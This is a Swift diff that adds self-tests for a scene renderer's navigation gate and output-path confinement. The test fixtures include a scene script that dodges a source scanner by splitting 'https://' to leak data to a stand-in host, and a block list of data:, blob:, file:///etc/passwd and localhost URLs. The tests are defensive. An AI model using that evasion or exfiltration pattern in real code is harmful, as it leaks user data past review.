@@ -28,6 +28,7 @@ extension SelfTests {
             TestCase(name: "runtime.check.compileFailureSkipsRendering", run: RuntimeTests.checkCompileFailure),
             TestCase(name: "runtime.check.symlinkedCheckDirectory", run: RuntimeTests.checkSymlinkedCheckDirectory),
             TestCase(name: "runtime.render.outputConfinement", run: RuntimeTests.renderOutputConfinement),
+            TestCase(name: "runtime.render.navigationGate", run: RuntimeTests.navigationGate),
             TestCase(name: "runtime.client.roundTripAndErrors", run: RuntimeTests.clientRoundTrip),
             TestCase(name: "runtime.client.waitsForServerHoldingLock", run: RuntimeTests.clientWaitsForLockHolder),
             TestCase(name: "runtime.e2e.templateCheck", run: RuntimeTests.endToEnd),
@@ -440,6 +441,40 @@ enum RuntimeTests {
         try refused(RenderRequest(op: .bench, html: html.path, out: check.appendingPathComponent("z.png").path), "bench writes nothing")
     }
 
+    /// Scene web views allow exactly the load their host started; a scene navigating anywhere
+    /// (`location = 'ht' + 'tps://…'` gets past the source scanner) is cancelled.
+    static func navigationGate() throws {
+        typealias R = SceneNavigationGate.Request
+        let base = URL(string: "livepaper-render://scene/")!
+        var render = SceneNavigationGate()
+        try expect(!render.decide(R(url: base, isMainFrame: true)), "nothing is allowed before the host loads")
+        render.expect(base)
+        try expect(!render.decide(R(url: URL(string: "https://lpnav.invalid/leak?d=secret"), isMainFrame: true)), "remote")
+        try expect(!render.decide(R(url: base, isMainFrame: false)), "subframe")
+        try expect(!render.decide(R(url: base, isMainFrame: true, opensNewWindow: true)), "new window")
+        try expect(!render.decide(R(url: base, isMainFrame: true, kind: .linkActivated)), "link")
+        try expect(!render.decide(R(url: base, isMainFrame: true, isDownload: true)), "download")
+        try expect(render.decide(R(url: base, isMainFrame: true)), "the host's own load")
+        try expect(!render.decide(R(url: base, isMainFrame: true)), "only once: a scene reloading itself is cancelled")
+        try expect(!render.decide(R(url: URL(string: "livepaper-render://scene/#t=3"), isMainFrame: true)), "in-page navigation")
+        render.expect(base)
+        try expect(render.decide(R(url: URL(string: "livepaper-render://scene/")!, isMainFrame: true)), "re-armed by the next host load")
+
+        var saver = SceneNavigationGate()
+        saver.expect(URL(string: "about:blank")!)
+        for blocked in ["data:text/html,<p>x", "blob:null/1234", "about:srcdoc", "file:///etc/passwd", "http://127.0.0.1/"] {
+            try expect(!saver.decide(R(url: URL(string: blocked), isMainFrame: true)), blocked)
+        }
+        try expect(saver.decide(R(url: URL(string: "about:blank"), isMainFrame: true)), "saver's loadHTMLString(baseURL: nil)")
+
+        var preview = SceneNavigationGate()
+        let file = URL(fileURLWithPath: "/tmp/LivePaperPreviews/aurora-1.html")
+        preview.expect(file)
+        try expect(!preview.decide(R(url: URL(fileURLWithPath: "/tmp/LivePaperPreviews/other.html"), isMainFrame: true)), "other file")
+        try expect(preview.decide(R(url: file, isMainFrame: true)), "the preview's own file")
+        try expectEqual(SceneNavigationGate.describe(URL(string: "https://user:pw@lpnav.invalid/leak?d=secret#x")), "https://lpnav.invalid/leak")
+    }
+
     static func checkCompileFailure() throws {
         let pkg = try package("broken", js: "fetch('x');\n" + minimalScene)
         let fake = FakeRender()
@@ -567,5 +602,41 @@ enum RuntimeTests {
         try expect(t.ok, t.note ?? "thumbnail failed")
         let jpeg = try Data(contentsOf: thumb)
         try expect(jpeg.starts(with: [0xFF, 0xD8]), "JPEG")
+
+        // The server refuses to write outside the request's package / workspaces / temp folders.
+        let fm = FileManager.default
+        let outside = fm.homeDirectoryForCurrentUser.appendingPathComponent("Library/Caches/LivePaperSelfTest-\(UUID().uuidString.prefix(8))")
+        try fm.createDirectory(at: outside, withIntermediateDirectories: true)
+        defer { try? fm.removeItem(at: outside) }
+        let victim = outside.appendingPathComponent("victim.png")
+        try Data("not an image".utf8).write(to: victim)
+        let html = pkg.appendingPathComponent(".check/scene.html").path
+        for (request, what) in [(RenderRequest(op: .still, html: html, width: 320, height: 200, dpr: 1, t: 1, out: victim.path), "still outside"),
+                                (RenderRequest(op: .still, html: html, width: 320, height: 200, dpr: 1, t: 1,
+                                               out: pkg.appendingPathComponent(".check/notes.docx").path), "not a PNG"),
+                                (RenderRequest(op: .thumbnail, scene: pkg.path, out: outside.appendingPathComponent("thumbnail.jpg").path), "thumbnail outside")] {
+            let r = try client.sendBlocking(request, timeout: 60)
+            try expect(!r.ok && (r.note ?? "").contains("only writes"), "\(what): \(r.ok) \(r.note ?? "")")
+        }
+        try expectEqual(try String(contentsOf: victim, encoding: .utf8), "not an image")
+        try expectEqual(try fm.contentsOfDirectory(atPath: outside.path), ["victim.png"])
+
+        // A scene that navigates away (a URL the source scanner can't see) is stopped, not loaded.
+        let nav = try package("navigates", js: """
+        LivePaper.scene({
+          setup(lp) { location.href = 'https:' + '/' + '/lpnav.invalid/leak?d=' + lp.w; },
+          draw(lp) { lp.ctx.fillStyle = '#102040'; lp.ctx.fillRect(0, 0, lp.w, lp.h); }
+        });
+        """)
+        defer { try? fm.removeItem(at: nav.deletingLastPathComponent()) }
+        let navHTML = nav.appendingPathComponent(".check/scene.html")
+        try SceneCompiler().compile(package: nav, to: navHTML)
+        let n = try client.sendBlocking(RenderRequest(op: .still, html: navHTML.path, width: 320, height: 200, dpr: 1, t: 1,
+                                                      out: nav.appendingPathComponent(".check/still.png").path), timeout: 60)
+        let blocked = (n.note ?? "").contains("tried to navigate") || n.errors.contains { $0.contains("tried to navigate") }
+        try expect(blocked && !(n.note ?? "").contains("hostname"), "navigation: ok=\(n.ok) note=\(n.note ?? "-") errors=\(n.errors)")
+        let navCheck = try blocking { try await SceneChecker(render: client).check(package: nav, options: CheckOptions(quick: true)) }
+        try expect(!navCheck.passed && navCheck.jsErrors.contains { $0.contains("tried to navigate to https://lpnav.invalid/leak") },
+                   "check fails a navigating scene: \(navCheck.problems)")
     }
 }
